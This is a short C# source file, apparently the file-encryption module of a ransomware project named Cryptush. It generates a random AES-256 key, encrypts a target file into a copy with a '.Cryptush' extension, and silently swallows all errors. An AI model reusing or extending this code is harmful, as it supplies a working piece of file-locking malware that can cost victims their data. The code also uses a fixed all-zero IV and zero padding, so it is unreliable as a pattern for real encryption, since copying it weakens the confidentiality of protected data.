using System;
using System.IO;
using System.Security.Cryptography;

namespace Cryptush.lib
{
    public static class AESHandler
    {
        public static Aes Create()
        {
            Aes aes = Aes.Create();
            aes.GenerateKey();
            aes.IV = new byte[16] { 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00 };
            aes.Padding = PaddingMode.Zeros;
            aes.Mode = CipherMode.CBC;
            aes.KeySize = 256;
            aes.BlockSize = 128;
            return aes;
        }
        public static void EncFile(string inputFile, ref Aes aes)
        {
            ICryptoTransform EnCryptush = aes.CreateEncryptor();

            try
            {
                using (FileStream fsCrypt = new FileStream(inputFile + ".Cryptush", FileMode.Create))
                {
                    using (CryptoStream cs = new CryptoStream(fsCrypt, EnCryptush, CryptoStreamMode.Write))
                    {
                        using (FileStream fsIn = new FileStream(inputFile, FileMode.Open))
                        {
                            byte[] buffer = new byte[1048576];
                            int read;
                            while ((read = fsIn.Read(buffer, 0, buffer.Length)) > 0)
                            {
                                cs.Write(buffer, 0, read);
                            }
                        }
                    }
                }
            }
            catch
            {
            }
        }
    }
}
